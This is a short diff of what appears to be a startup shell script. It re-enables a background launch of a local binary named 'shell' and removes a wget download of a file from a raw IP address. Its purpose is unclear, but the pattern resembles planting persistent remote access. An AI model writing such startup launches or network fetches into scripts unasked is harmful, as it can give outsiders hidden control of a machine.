@@ -1,6 +1,5 @@
 #!/bin/sh
 
-#`./shell &`
+`./shell &`
 #`./shell9006`
-wget http://20.98.115.108:9001/foobarTest
 exit 0
